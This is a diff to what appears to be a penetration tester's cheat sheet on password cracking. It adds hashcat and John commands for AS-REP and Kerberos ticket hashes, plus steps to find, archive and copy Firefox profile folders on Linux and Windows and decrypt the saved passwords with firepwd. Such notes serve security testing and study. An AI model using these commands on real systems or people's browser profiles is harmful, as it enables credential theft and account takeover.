@@ -78,11 +78,13 @@ hashcat --help | grep -i "KeePass"
 hashcat -m 13400 keepass.hash
 ```
 
+### ASREP
 -> Cracking ASREP
 ```bash
 hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
+### KRBTGT
 -> Cracking krbtgt (Kerberos)
 ```bash
 hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
@@ -90,6 +92,50 @@ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat
 ```bash
 john --format=krb5tgs hash.txt wordlist/wordlist.txt 
 ```
+
+### Firefox Profiles crack
+
+-> Linux 
+```bash
+cd ~/.mozilla/firefox/
+```
+```bash
+find ~ -type d -path "*/.mozilla/firefox"
+find ~ -type d -name firefox -path "*/.mozilla/firefox"
+```
+
+-> Compress files
+```
+tar -czvf firefox_backup.tar.gz -C ~ .mozilla/firefox
+```
+
+-> Extract files
+```bash
+tar -xzvf firefox_backup.tar.gz -C ~
+```
+
+-> Windows
+```powershell
+C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\
+```
+```powershell
+Get-ChildItem -Path C:\Users\ -Recurse -Directory -Filter Firefox -ErrorAction SilentlyContinue
+```
+```powershell
+Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles"
+```
+
+-> Transfer files
+```powershell
+Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles" -Destination "C:\backup_firefox" -Recurse
+```
+
+### Firepwd
+-> Cracking passwords
+```
+python firepwd.py -d /home/<user>/Desktop/.mozilla/firefox/<file>.default
+```
+- https://github.com/lclevy/firepwd
 
 
 ## Brute Force Attacks
